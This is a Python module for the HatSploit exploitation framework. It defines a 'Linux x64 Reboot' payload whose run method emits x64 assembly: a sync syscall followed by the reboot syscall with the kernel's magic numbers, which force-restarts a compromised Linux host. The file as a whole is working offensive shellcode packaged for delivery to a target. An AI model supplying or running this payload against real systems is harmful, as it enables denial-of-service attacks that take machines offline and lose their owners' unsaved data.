"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.payload.basic import *
from hatsploit.lib.core.payload.linux import Linux


class HatSploitPayload(Payload, Linux):
    def __init__(self):
        super().__init__({
            'Name': "Linux x64 Reboot",
            'Payload': "linux/x64/reboot",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - payload developer",
            ],
            'Description': """
                This payload is intended to force reboot Linux
                with x64 architecture.
            """,
            'Arch': ARCH_X64,
            'Platform': OS_LINUX,
            'Type': ONE_SIDE,
        })

    def run(self):
        return self.__asm__(
            """
            start:
                mov al, 0xa2
                syscall

                mov al, 0xa9
                mov edx, 0x1234567
                mov esi, 0x28121969
                mov edi, 0xfee1dead
                syscall
            """,
        )
